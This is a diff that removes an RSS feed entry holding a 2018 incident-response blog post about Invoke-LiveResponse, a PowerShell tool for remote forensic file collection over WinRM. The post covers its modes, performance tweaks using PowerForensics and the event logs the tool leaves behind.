-&lt;p&gt;To minimise credential risk, CredSSP (and any basic) authentication over WinRM should always be disabled. This results in a network logon type 3 and protected credentials of the account running WinRM. The drawbacks here means our SMB share for copy use cases requires unauthenticated write access or credentials passed into the script at runtime. As share credentials will be pushed to the endpoint, best practice would be to create temporary account/access to our share for the duration of our redirected file acquisition.&lt;/p&gt;
-
-&lt;h3 id=&quot;memory&quot;&gt;Memory&lt;/h3&gt;
-&lt;p&gt;Powershell has a configuration option to restrict the amount of memory available in a shell. This value is called MaxMemoryPerShellMB, and depending on Powershell version may be set in both Shell and Plugin WSMan configurations. In Powershell 2.0, the default is 150MB, which will likely need to be increased or turned off. As later versions of Powershell have been released, the default values have risen appropriately for most WinRM use, for example in 3.0 MaxMemoryPerShellMB = 1024, which is multiples above required memory.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# To view this setting locally&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# To edit this setting locally&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;The simplest approach is to deploy WinRM via Group policy and configure these settings via GPO or logon script. For manual intervention, Invoke-MaxMemory will connect via WinRM and turn off this setting (set to 0). Powershell 2.0 has restrictions in remotely changing WinRM settings, although not ideal from a forensic standpoint, the “–Legacy” switch uses scheduled tasks to force a local configuration change.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/05Maxmemory.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;invoke-liveresponse-1&quot;&gt;Invoke-LiveResponse&lt;/h2&gt;
-&lt;p&gt;The current scope of Invoke-LiveResponse is a live response tool for targeted collection. There are two main modes of use in Invoke-LiveResponse and both are configured by a variety of command line switches.&lt;/p&gt;
-
-&lt;h3 id=&quot;forensiccopy&quot;&gt;ForensicCopy&lt;/h3&gt;
-&lt;p&gt;Configured by simple command line switches, Invoke-LiveResponse enables file collection from a remote machine over WinRM.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Reflectively loads Powerforensics onto target machine to enable raw disk access.&lt;/li&gt;
-  &lt;li&gt;Leverages a scriptblock for each configured function of the script.&lt;/li&gt;
-  &lt;li&gt;Common forensic artefacts and custom file collections.&lt;/li&gt;
-  &lt;li&gt;Depending on the selected switches, each selected capability is joined at run time to build the scriptblock pushed out to the target machine.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinRMtester&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Map&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Drive&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UNC&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\\&amp;lt;Server&amp;gt;\&amp;lt;folder&amp;gt; /user:&amp;lt;optional share credentials&amp;gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;br /&gt;
-Some of the available configuration options:&lt;/p&gt;
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/07parameters1.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
-Some of the switches available in ForensicCopy mode:&lt;/p&gt;
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/08parameters2.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;live-response&quot;&gt;Live Response&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Inspired by the Kansa Framework, LiveResponse mode will execute any Powershell scripts placed inside a content folder.&lt;/li&gt;
-  &lt;li&gt;Results consist of the standard out from the executed content, redirected from the collection machine to a local Results folder as ScriptName.txt.&lt;/li&gt;
-  &lt;li&gt;The benefit of this method is the ability to operationalise new capability easily by dropping in new content with desired StdOut.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Command to run Powersell mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinRMtester&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-LR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Results&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e.g&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Cases&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/09LiveResponse.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Some of the additional switches available in LiveResponse and shell mode:&lt;/p&gt;
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/10parameters3.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;performance-tweaks&quot;&gt;Performance Tweaks&lt;/h3&gt;
-&lt;p&gt;Testing for Invoke-LiveResponse has primarily been on Windows 7 and 8.1, with some minor testing on Windows 10 and Server Operating systems. I have also tested on Powershell 2.0 to 5.0 target machines. The decision was made to use Powerforensics to enable raw collection and bypass the need to drop or run binaries as much as possible&lt;/p&gt;
-
-&lt;p&gt;Powerforensics is the best Powershell based forensics framework available, but has not been primarily designed for remote raw collections. With that in mind, during testing I discovered an issue in Powerforensics Copy command-lets around memory utilisation and limitation of file size. The limitation is around 2.1GB (Int32 max bytes) and caused by the way Powerforensics builds a byte array for the complete file stream prior to copying. The limitation also means that memory consumption for my use cases (large system files) spiked up to at least the size of the file.&lt;/p&gt;
-
-&lt;p&gt;Normally this would be a game killer for using Powerforensics in this way. However, one of its best features is the ability to use an API and collect data at the appropriate level for your needs. In this case, I was able to leverage the Powerforensics API to collect files of interest in smaller chunks. The public method used is called ForensicDD and I am doing some traditional volume boot record calculations to enable a low memory footprint. File size limitations are also removed as the byte stream size has been significantly reduced.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/11forensicdd.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Its also worthy to note, the capability to copy alternate data streams besides hard coded special files is not exposed to the user. The ForensicCopy function will simply copy resident bytes or the DATA stream for a normal Raw file copy.&lt;/p&gt;
-
-&lt;p&gt;Another performance tweak was with UsnJournal:$J to limit the collection to non-sparse data. This differs from most forensic collection tools that acquire all $J data and results in a bloated collection including redundant zeros. This method did hit a snag for an edgecase on a 2012R2 server where Powerforensics failed to parse the MFT entry as expected for the UsnJournal. This case is currently under review however I decided to implement a fall back collection via fsutil if required.&lt;/p&gt;
-
-&lt;p&gt;In any case I would recommend tool validation of this collection compared to current tools. In my testing I was able to validate file size and entries with another tool with a similar approach finding sample journal entries as expected.&lt;/p&gt;
-
-&lt;p&gt;Finally, for user experience, I also decided to implement CPU prioritisation to run my collection on idle CPU cycles only.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/12idlecpu.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;forensic-footprint&quot;&gt;Forensic Footprint&lt;/h3&gt;
-&lt;p&gt;The most important factor for forensic footprint should be to know and validate your tools. To respect the order of volatility I have moved Live Response mode to run first to minimise impact by ForensicCopy mode. I would also recommend a naming scheme of Live Response content to further respect order of volatility.&lt;/p&gt;
-
-&lt;p&gt;There has been significant research to optimise target memory performance to be as low as possible. As primarily running in memory, the visible disk footprint of Powershell remoting is relatively small during a PSSession. With default logging, only expected authentication events and very basic WinRM and Powershell logs are generated. Wsmprovhost.exe is spawned on the target machine when running Invoke-LiveResponse and target disk activity is minimised with a remote share transfer. Depending on the collection, Net.exe and any other binaries called in script content may also be spawned from wsmprovhost.exe for their relevant functions.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/13Process.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;During the collection we see the expected authentication IDs 4624 and 4672 to access the target machine. When in ForensicCopy mode, if enabled we also see Event ID 4648 - explicit logon resulting from the collection copy to remote share.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/14_4648.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;In Powershell 5+ environments the capability to enable Powershell scriptblock logging highlights the benefit of visibility with Event ID 4104. Over multiple events we can see the Powerforensics functions being pushed to the target machine, decompressed and loaded to memory with the Add-PowerForensicsType function. We can also see the script block itself in the log. For a complete version, I have included a copy of the raw transaction logs &lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/tree/master/other/Invoke-LiveResponse/Powershell%20Transcript&quot;&gt;here&lt;/a&gt; for review.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/15_4104.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Finally Event ID 4103 – Module logging records pipeline execution details as seen in the example below. Module logging has been available since Powershell 3+ and although not as verbose as 4104, collected context about the commands run inside my script block. Below you can see datastream preparation for an $MFT raw copy. Host application as “wsmprovhost.exe -Embedding” indicates a PSSession generated event.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/16_4103.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;future-development-ideas&quot;&gt;Future development ideas&lt;/h3&gt;
-&lt;p&gt;Invoke-LiveResponse has currently been limited scope. Some ideas for additional features are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Add memory collection capability to ForensicCopy mode for less reliance on LiveResponse scripts (and make appropriate order of volatility changes).&lt;/li&gt;
-  &lt;li&gt;Expand scope to enable more scale through Powershell Start-Job capabilities.&lt;/li&gt;
-  &lt;li&gt;Larger artefact coverage in ForensicCopy mode.&lt;/li&gt;
-  &lt;li&gt;Automate analysis tasks.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
-&lt;p&gt;In this post I have walked through Invoke-LiveResponse, a Powershell module that enables raw file collections and live response over WinRM. Work still needs to be done on scale optimisations, however it provides a viable option of raw collection when other tools fail.&lt;/p&gt;
-
-&lt;p&gt;This kind of capability highlights where I believe Microsoft focused shops will be heading in the future. Although a political nightmare to setup in large environments, the Microsoft mantra of constrained endpoints, just in time administration and transparency in Powershell logging really assists opening up capability whilst minimising risk of remote administration.&lt;/p&gt;
-
-&lt;p&gt;Overall it has been a great learning experience putting together, and optimising some of the Powershell features. Im hoping others can benefit from this post as much as I have enjoyed the research and writing it. Feel free to reach out if you have any questions, find any bugs or pull requests.&lt;/p&gt;
-
-&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;Atkinson, Jared. &lt;a href=&quot;http://www.invoke-ir.com/&quot;&gt;Invoke-IR / Powerforensics&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Australian Signals Directorate. &lt;a href=&quot;http://www.asd.gov.au/publications/protect/Securing_PowerShell.pdf&quot;&gt;Securing PowerShell in the Enterprise&lt;/a&gt;, 2016&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Dunwoody, Matthew. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.htm&quot;&gt;Greater Visibility Through PowerShell Logging&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Forensics wiki. &lt;a href=&quot;http://www.forensicswiki.org/wiki/New_Technology_File_System_NTFS&quot;&gt;New Technology File Systems (general NTFS information)&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Green, Matthew. &lt;a href=&quot;https://www.linkedin.com/pulse/powershell-remoting-incident-response-matthew-green/&quot;&gt;Powershell Remoting and Incident Response (WinRM lab setup)&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Invoke-LiveResponse &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Sayer, Matthew. &lt;a href=&quot;http://www.hecfblog.com/2017/05/contents-in-sparse-mirror-may-be.html&quot;&gt;Contents in sparse mirror may be smaller than they appear&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-</description>
-        <pubDate>Sun, 14 Jan 2018 00:00:00 +1100</pubDate>
-        <link>https://mgreen27.github.io//posts/2018/01/14/Invoke-LiveResponse.html</link>
-        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html</guid>
-        
-        <category>DFIR</category>
-        
-        <category>Powershell</category>
-        
-        <category>LiveResponse</category>
-        
-        <category>IR</category>
         
         
         <category>posts</category>
